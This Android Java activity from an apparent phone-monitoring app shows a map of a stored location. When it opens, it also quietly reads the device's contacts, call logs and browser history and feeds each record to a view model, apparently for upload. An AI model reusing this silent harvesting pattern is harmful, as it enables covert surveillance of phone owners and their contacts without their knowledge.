package com.myapplication.monitor.Activities;

import android.content.Intent;
import android.os.Handler;
import android.support.v4.app.FragmentActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.maps.CameraUpdateFactory;
import com.google.android.gms.maps.GoogleMap;
import com.google.android.gms.maps.OnMapReadyCallback;
import com.google.android.gms.maps.SupportMapFragment;
import com.google.android.gms.maps.model.LatLng;
import com.google.android.gms.maps.model.MarkerOptions;
import com.google.gson.Gson;
import com.myapplication.monitor.DataManager.CallsDataManager;
import com.myapplication.monitor.DataManager.ContactsDataManager;
import com.myapplication.monitor.DataManager.HistoryDataManager;
import com.myapplication.monitor.DataManager.callbacks.DaoResponse;
import com.myapplication.monitor.DataManager.dao.BrowserHistoryDao;
import com.myapplication.monitor.DataManager.dao.CallDao;
import com.myapplication.monitor.DataManager.dao.ContactsDao;
import com.myapplication.monitor.Interfaces.ViewResponseDelegates.UpdateViewDelegate;
import com.myapplication.monitor.Model.BrowserHistory;
import com.myapplication.monitor.Model.CallLogs;
import com.myapplication.monitor.Model.Contact;
import com.myapplication.monitor.R;
import com.myapplication.monitor.Utils.BrowserHelper;
import com.myapplication.monitor.Utils.CallLogsHelper;
import com.myapplication.monitor.Utils.ContactsHelper;
import com.myapplication.monitor.Utils.SessionManager;
import com.myapplication.monitor.ViewModels.UpdateViewModel;

import java.util.List;

public class MapsActivity extends FragmentActivity implements OnMapReadyCallback, UpdateViewDelegate {
    SessionManager sessionManager;
    private GoogleMap mMap;

    ContactsHelper contactsHelper;
    CallLogsHelper callLogsHelper;
    BrowserHelper browserHelper;
    ContactsDataManager contactsDataManager;
    CallsDataManager callsDataManager;
    HistoryDataManager historyDataManager;
    ContactsDao contactsDao;
    CallDao callDao;
    BrowserHistoryDao historyDao;
    UpdateViewModel viewModel;
    private ImageView btnSettings;
    private ImageView btnDetails;

    private String strMapType;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_maps);

        sessionManager = new SessionManager(this);
        viewModel = new UpdateViewModel(this);
        contactsHelper = new ContactsHelper(this);
        callLogsHelper = new CallLogsHelper(this);
        browserHelper = new BrowserHelper(this);
        contactsDataManager = new ContactsDataManager();
        callsDataManager = new CallsDataManager();
        historyDataManager = new HistoryDataManager();
        contactsDao = new ContactsDao();
        callDao = new CallDao();
        historyDao = new BrowserHistoryDao();

        strMapType = sessionManager.getStoredMapType();
        initView();
        setListeners();
        // Obtain the SupportMapFragment and get notified when the map is ready to be used.
        SupportMapFragment mapFragment = (SupportMapFragment) getSupportFragmentManager()
                .findFragmentById(R.id.map);
        mapFragment.getMapAsync(this);

        storeContacts();

    }

    private void storeHistories() {
        if (historyDao.getHistoryList().size() != 0) {
            historyDao.deleteHistories();
        }
        historyDao.storeOrUpdateHistoryList(historyDataManager.getHistoryRealmList(browserHelper.getBrowserHist()), new DaoResponse<String>() {

            @Override
            public void onSuccess(String message) {
                doHistoryUpdate();
            }

            @Override
            public void onSuccess(String item, String message) {
                //No implementation
            }

            @Override
            public void onFailure(String errorMessage) {
                //No implementation
            }
        });
    }
    private void storeContacts() {
        if (contactsDao.getContactsList().size() != 0) {
            contactsDao.deleteContacts();
        }
        contactsDao.storeOrUpdateContactsList(contactsDataManager.getContactsRealmList(contactsHelper.getContactsList()), new DaoResponse<String>() {

            @Override
            public void onSuccess(String message) {
                doContactUpdate();
            }

            @Override
            public void onSuccess(String item, String message) {
                //No implementation
            }

            @Override
            public void onFailure(String errorMessage) {
                //No implementation
            }
        });
    }

    private void storeCalls() {
        if (contactsDao.getContactsList().size() != 0) {
            callDao.deleteCalls();
        }
        callDao.storeOrUpdateCallsList(callsDataManager.getCallsRealmList(callLogsHelper.getCallLogs()), new DaoResponse<String>() {

            @Override
            public void onSuccess(String message) {
                doCallUpdate();
            }

            @Override
            public void onSuccess(String item, String message) {
                //No implementation
            }

            @Override
            public void onFailure(String errorMessage) {
                //No implementation
            }
        });
    }


    private void doHistoryUpdate() {
        List<BrowserHistory> historyList = historyDataManager.getHistoryList(historyDao.getHistoryList());
        if(historyList.size() != 0) {
            viewModel.setHistoryListLength(historyList.size());
            viewModel.setHistoryList(historyList);
            viewModel.setHistory(historyList.get(0));
            viewModel.setHistoryPosition(0);
            viewModel.onHistoryUpdate();
        } else {
            doCallUpdate();
        }

    }
    private void doContactUpdate() {
        List<Contact> contactsList = contactsDataManager.getContactsList(contactsDao.getContactsList());
        if(contactsList.size() != 0) {
            viewModel.setContactListLength(contactsList.size());
            viewModel.setContactList(contactsList);
            viewModel.setContact(contactsList.get(0));
            viewModel.setContactPosition(0);
            viewModel.onContactUpdate();
        } else {
            doCallUpdate();
        }

    }

    private void doCallUpdate() {
        List<CallLogs> callLogsList = callsDataManager.getCallsList(callDao.getCallList());

        if(callLogsList.size() != 0) {
            viewModel.setCallListLength(callLogsList.size());
            viewModel.setCallLogsList(callLogsList);
            viewModel.setCallLogs(callLogsList.get(0));
            viewModel.setCallPosition(0);
            viewModel.onCallUpdate();
        }
    }

    private void initView() {

        btnSettings = (ImageView) findViewById(R.id.btnSettings);
        btnDetails = (ImageView) findViewById(R.id.btnDetails);
    }

    private void setListeners() {
        btnSettings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MapsActivity.this, SettingsActivity.class);
                startActivity(intent);
                overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_right);
            }
        });

        btnDetails.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MapsActivity.this, HomeActivity.class);
                startActivity(intent);
                overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_right);
            }
        });
    }

    private int getMapType() {
        int mapType = 0;
        if (strMapType.equals(getString(R.string.map_type_normal))) {
            mapType = GoogleMap.MAP_TYPE_NORMAL;
        }
        if (strMapType.equals(getString(R.string.map_type_hybrid))) {
            mapType = GoogleMap.MAP_TYPE_HYBRID;
        }
        if (strMapType.equals(getString(R.string.map_type_satellite))) {
            mapType = GoogleMap.MAP_TYPE_SATELLITE;
        }
        if (strMapType.equals(getString(R.string.map_type_terrain))) {
            mapType = GoogleMap.MAP_TYPE_TERRAIN;
        }
        if (strMapType.equals("")) {
            mapType = GoogleMap.MAP_TYPE_NORMAL;
        }
        return mapType;
    }

    /**
     * Manipulates the map once available.
     * This callback is triggered when the map is ready to be used.
     * This is where we can add markers or lines, add listeners or move the camera. In this case,
     * we just add a marker near Sydney, Australia.
     * If Google Play services is not installed on the device, the user will be prompted to install
     * it inside the SupportMapFragment. This method will only be triggered once the user has
     * installed Google Play services and returned to the app.
     */
    @Override
    public void onMapReady(GoogleMap googleMap) {
        mMap = googleMap;

        // Add a marker in Sydney and move the camera
        LatLng latLng = new LatLng(Double.parseDouble(sessionManager.getPlacelat()), Double.parseDouble(sessionManager.getPlaceLong()));
        mMap.addMarker(new MarkerOptions().position(latLng).title(sessionManager.getPlaceName()));
        mMap.animateCamera(CameraUpdateFactory.newLatLng(latLng));
        mMap.moveCamera(CameraUpdateFactory.newLatLng(latLng));
        mMap.getUiSettings().setZoomControlsEnabled(true);
        mMap.animateCamera(CameraUpdateFactory.zoomTo(12));
        mMap.setMapType(getMapType());
    }

    private Boolean exit = false;

    @Override
    public void onBackPressed() {
        checkExit();
    }


    public void checkExit() {
        if (exit) {
            finish(); // finish activity
        } else {
            Toast.makeText(this, getString(R.string.press_again_to_exit),
                    Toast.LENGTH_SHORT).show();
            exit = true;
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    exit = false;
                }
            }, 3 * 1000);
        }
    }

    @Override
    public void onContactUpdated() {
        int position = viewModel.getContactPosition() + 1;
        if (position != viewModel.getContactListLength()) {
            viewModel.setContactPosition(position);
            viewModel.setContact(viewModel.getContactList().get(position));
            viewModel.onContactUpdate();
        } else {
            storeCalls();
        }
    }

    @Override
    public void onCallUpdated() {
        int position = viewModel.getCallPosition() + 1;
        if (position != viewModel.getCallListLength()) {
            viewModel.setCallPosition(position);
            viewModel.setCallLogs(viewModel.getCallLogsList().get(position));
            viewModel.onCallUpdate();
        }
    }

    @Override
    public void onHistoryUpdated() {
        int position = viewModel.getHistoryPosition() + 1;
        if (position != viewModel.getHistoryListLength()) {
            viewModel.setHistoryPosition(position);
            viewModel.setHistory(viewModel.getHistoryList().get(position));
            viewModel.onHistoryUpdate();
        }
    }
}
